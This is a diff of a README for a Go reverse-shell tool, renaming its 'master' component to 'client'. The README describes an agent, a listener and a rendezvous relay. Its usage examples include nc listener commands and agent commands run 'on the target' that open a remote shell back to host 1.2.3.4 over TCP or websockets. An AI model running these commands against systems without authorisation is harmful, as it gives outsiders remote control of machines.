@@ -24,8 +24,8 @@ Here is a some features of this Go implementation:
 
 This projects contains 3 applications that help you setting and interacting with remote shells:
 * an `agent` to be started on the server where you want to open a shell
-* a `master` waiting for agent connections and that allow you to interact with the shells
-* a `rendezvous` application providing a central point where agents and masters meet when a direct connection is not possible/wanted (not mandatory)
+* a `client` waiting for agent connections and that allow you to interact with the shells
+* a `rendezvous` application providing a central point where agents and clients meet when a direct connection is not possible/wanted (not mandatory)
 
 ## Installation
 Download the binaries
@@ -42,7 +42,7 @@ $ cd reverse-shell && make
 ## Example of usage
 Direct, with TCP:
 ```bash
-# On the master (1.2.3.4)
+# On the client (1.2.3.4)
 $ nc 1.2.3.4 7777
 
 # On the target
@@ -51,8 +51,8 @@ $ reverse-shell-agent tcp --host=1.2.3.4 --port=7777
 
 Direct with Websockets:
 ```bash
-# On the master (1.2.3.4)
-$ reverse-shell-master listen --port=7777
+# On the client (1.2.3.4)
+$ reverse-shell-client listen --port=7777
 
 # On the target
 $ reverse-shell-agent websocket --url=http://1.2.3.4:7777
@@ -66,18 +66,18 @@ $  reverse-shell-rendezvous --port=7777
 # On the target
 $ reverse-shell-agent websocket --url=http://1.2.3.4:7777
 
-# On the master
-$ reverse-shell-master rendezvous list-agents --url=http://1.2.3.4:7777
+# On the client
+$ reverse-shell-client rendezvous list-agents --url=http://1.2.3.4:7777
 List of agents:
 * 3.4.5.6:65000
 
 # Create a session
-$ reverse-shell-master rendezvous create-session --url=http://1.2.3.4:7777 3.4.5.6:65000
+$ reverse-shell-client rendezvous create-session --url=http://1.2.3.4:7777 3.4.5.6:65000
 ```
 
 The complete usage is available for each component:
 - [agent](docs/agent/reverse-shell-agent.md)
-- [master](docs/master/reverse-shell-master.md)
+- [client](docs/client/reverse-shell-client.md)
 - [rendezvous](docs/rendezvous/reverse-shell-rendezvous.md)
 
 ## Todo
